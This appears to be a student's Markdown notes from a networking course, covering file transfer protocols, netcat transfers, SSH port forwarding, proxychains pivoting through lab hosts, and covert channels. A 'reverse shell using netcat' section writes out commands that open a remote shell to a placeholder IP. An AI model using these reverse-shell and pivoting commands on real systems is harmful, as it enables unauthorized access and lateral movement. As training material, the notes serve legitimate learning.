# DATA TRANSFER, MOVEMENT, AND REDIRECTION

## DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
- TFTP
- FTP
  - Active (A client initiates a connection with a server on port 21 from the client’s ephemeral high port.)
  ![image](https://github.com/TJClarke58/Networking.md/assets/140441047/2b6a1e7a-d01e-4e41-92c1-900db9407057)
  - Passive (Passive FTP sidesteps the issue of Active mode by reversing the conversation.)
  ![image](https://github.com/TJClarke58/Networking.md/assets/140441047/e3f75464-8665-4cc0-9d6e-f2749fccd61f)
- SFTP
- SCP

## TFTP (Trivial File Transfer Protocol)
- RFC 1350 Rev2
- UDP transport
- Extremely small and very simple communication
- No terminal communication ()
- Insecure (no authentication or encryption)
- No directory services
- Used often for technologies such as BOOTP and PXE

## FTP (File Transfer Protocol)
- RFC 959
- TCP transport
- Uses multiple TCP connections
- Control Connection (21) / Data Connection (20)
- Authentication through clear-text sign in (username and password)
- Insecure in default configuration
- Has directory services
- Can be enhanced with SSL/TLS (FTPS)
- Anonymous login

## SFTP (Secure File Transfer Protocol)
- TCP transport (TCP port 22)
- Uses symmetric and asymmetric encryption
- Adds FTP like services to SSH
- Authentication through sign in (username and password) or with SSH key
- Interactive terminal access

## FTPS (File Transfer Protocol Secure)
- TCP transport (TCP port 443)
- Adds SSL/TLS encryption to FTP
- Authentication with username/password and/or PKI
- Interactive terminal access

## SCP (Secure Copy Protocol)
- TCP Transport (TCP port 22)
- Uses symmetric and asymmetric encryption
- Authentication through sign in (username and password) or with SSH key
- Non Interactive

## SCP SYNTAX
- Download a file from a remote directory to a local directory
  ```
  $ scp student@172.16.82.106:secretstuff.txt /home/student
  ```
- Upload a file to a remote directory from a local directory
  ```
  $ scp secretstuff.txt student@172.16.82.106:/home/student
  ```
- Copy a file from a remote host to a separate remote host
  ```
  $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
  ```

## SCP SYNTAX W/ ALTERNATE SSHD
- Download a file from a remote directory to a local directory
  ```
  $ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
  ```
- Upload a file to a remote directory from a local directory
  ```
  $ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
  ```

## SCP SYNTAX THROUGH A TUNNEL
```
ssh student@172.16.82.106 -L 1111:localhost:22 -NT
```
- Download a file from a remote directory to a local directory
  ```
  $ scp -P 1111 student@localhost:secretstuff.txt /home/student
  ```
- Upload a file to a remote directory from a local directory
  ```
  $ scp -P 1111 secretstuff.txt student@localhost:/home/student
  ```

# TRAFFIC REDIRECTION USING TOOLS

## NETCAT
- NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol. It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
  - Can be used for the following:
    - inbound and outbound connections, TCP/UDP, to or from any ports
    - troubleshooting network connections
    - sending/receiving data (insecurely)
    - port scanning (similar to -sT in Nmap)

## NETCAT: CLIENT TO LISTENER FILE TRANSFER
```
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt
```

## NETCAT: LISTENER TO CLIENT FILE TRANSFER
```
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt
```

## NETCAT RELAY DEMOS
- On Client Relay:
  ```
  mknod mypipe p
  nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
  ```
- On Listener2 (sends info):
  ```
  nc -l -p 9002 < infile.txt
  ```
- On Listener1 (receives info):
  ```
  nc -l -p 9001 > outfile.txt
  ```
- Writes the output to listener1 and listener2 through the named pipe

## FILE TRANSFER WITH /DEV/TCP
- On the receiving box:
  ```
  nc -l -p 1111 > file.txt
  ```
- On the sending box:
  ```
  cat file.txt > /dev/tcp/10.2.0.2/1111
  ```
- This method is useful for host that does not have NETCAT available.

## REVERSE SHELL USING NETCAT
- When shelled into the remote host using -c :
  ```
  nc -c /bin/sh <your ip> <any unfiltered port>
  ```
- You could even pipe BASH through NETCAT.
  ```
  /bin/sh | nc <your ip> <any unfiltered port>
  ```
- Then listen for the shell.
  ```
  nc -l -p <same unfiltered port> -vvv
  ```
- You can also listen using the -e with NETCAT.
  ```
  nc -l -p <any unfiltered port> -e /bin/bash
  ```

# Tunneling

## SSH
- Various Implementations (v1 and v2)
- Provides authentication, encryption, and integrity.
- Allows remote terminal sessions
- Used for tunneling
- Created as a secure replacement for Berkeley Remote commands:
  - rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
  - rlogin - replaced with rlogin, provides remote login capability.
  - rcp - replaced with scp for secure file transfer
 
## SSH PORT FORWARDING
- Creates channels using SSH-CONN protocol
- Allows for tunneling of other services through SSH
- Provides insecure services encryption

## SSH LOCAL PORT FORWARDING
- Syntax
```
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
```
or
```
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
```

## SSH LOCAL PORT FORWARDING
- Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
```
ssh student@172.16.82.106 -L 1111:localhost:80 -NT
```
or
```
ssh -L 1111:localhost:80 student@172.16.82.106 -NT
```

## SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT
```
Internet Host:
ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
firefox localhost:2222
```
- Creates an additional local port on the local host that forwards to a target machine through the previous channel created.

## SSH DYNAMIC PORT FORWARDING
- Syntax
```
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
```
- Proxychains default port is 9050
- Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
- Allows the use of scripts and other userspace programs through the tunnel.

## SSH DYNAMIC PORT FORWARDING 1-STEP
```
Blue Private Host-1:
ssh student@172.16.82.106 -D 9050 -NT

proxychains ./scan.sh
proxychains ssh student@10.10.0.40
```

## SSH DYNAMIC PORT FORWARDING 2-STEP
```
Blue Private Host-1:
ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
ssh student@localhost -D 9050 -p 1111 -NT

proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./scan.sh
proxychains ssh student@172.16.101.2
```

## SSH LOCAL AND DYNAMIC PRACTICE
- START
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/a8c54658-e098-4296-bc63-75356e734673)
- FIRST PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/c39eae29-2df0-4671-bd64-d08c2c5af240)
- FIRST PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/680b82dc-bd03-48f1-b239-1ac057ad53f4)
- SECOND PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/08b22574-c9ce-4525-8f11-5e5797329eaf)
- SECOND PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/75de2056-d5b1-4943-9ad6-41e7c3e62e2b)
- THIRD PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/146bee62-8a9a-4b39-b986-e152a561a8e4)
- THIRD PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/c237e825-79ea-43d6-b1df-fcd6c73c1f3c)
- FORTH PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/69ee438e-9be1-4c5e-a7fe-31fc67a8de7a)

## SSH REMOTE PORT FORWARDING
- Syntax
```
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
```
or
```
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
```

## SSH REMOTE PORT FORWARDING
```
Blue Host-1
ssh student@10.10.0.40 -R 1111:localhost:80 -NT
```
- Creates a remote port on the remote’s local host that forwards to the target specified.

## SSH REMOTE AND LOCAL PORT FORWARDING
```
Blue Private Host-1:
ssh student@172.16.82.106 -R 1111:localhost:22 -NT

Internet Host:
ssh student@172.16.82.106 -L 2222:localhost:1111 -NT

Internet Host:
ssh localhost -p 2222
```
- Creates a remote port on a remote machine, staging a connection.
- Also creates a local port on the localhost to connect to the previously staged connection.
- Login to extra1 via the net1 local port forward

## SSH REMOTE PRACTICE
- FORTH PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/5777d7fd-1944-435c-815f-7b89b546bdc2)
- FORTH PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/311c99d9-9320-479b-8092-a3aaebf812ba)
- FIFTH PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/f2d6191e-39e3-4f59-a5cc-a065840be3ae)
- FIFTH PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/431fd452-0874-4ce0-9832-3d6ec8ad66a5)
- SIXTH PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/1e0cb200-c78f-4f40-9ef5-520302e0cd48)
- SIXTH PIVOT INTERNAL PASSIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/7c73e531-00f6-4644-a6c5-242378e833e3)
- SEVENTH PIVOT EXTERNAL ACTIVE RECON
![image](https://github.com/TJClarke58/Networking.md/assets/140441047/ca3ea5b2-d32f-4e9d-a473-69ec2d98d7bd)

## COVERT CHANNEL
- A Covert Channel is a method of creating a capability to transfer information objects between endpoints that should not be allowed based on policy.
- Strategies attackers use to avoid detection:
  - Tunnels
  - ICMP
  - DNS
  - HTTP

hi
